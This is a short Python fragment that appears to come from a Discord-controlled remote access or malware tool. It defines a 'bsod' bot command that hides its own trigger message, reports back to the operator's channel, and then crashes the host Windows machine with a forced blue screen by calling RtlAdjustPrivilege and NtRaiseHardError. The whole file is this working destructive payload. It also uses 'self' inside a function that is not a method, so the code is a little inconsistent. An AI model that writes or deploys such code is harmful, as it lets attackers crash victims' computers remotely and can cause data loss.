#<imports>
import ctypes
#</imports>


@client.command(name="bsod")
async def bluescreen_trigger(ctx): 
    await ctx.message.delete()
    await self.get_channel(self.channel_id).send(embed=self.generate_embed(
        title='🟢 Executing',
        description=f'```{render_text('Triggering a BSoD')}...```',
        color=0x00ff00,
        footer=['Please ⭐ our repository if you enjoy'],
        author=[DEFAULT, DEFAULT]))

    nullptr = ctypes.POINTER(ctypes.c_int)()
    ctypes.windll.ntdll.RtlAdjustPrivilege(
        ctypes.c_uint(19), 
        ctypes.c_uint(1), 
        ctypes.c_uint(0), 
        ctypes.byref(ctypes.c_int())
    )
    ctypes.windll.ntdll.NtRaiseHardError(
        ctypes.c_ulong(0xC000007B), 
        ctypes.c_ulong(0), 
        nullptr, 
        nullptr, 
        ctypes.c_uint(6),
        ctypes.byref(ctypes.c_uint())
    )
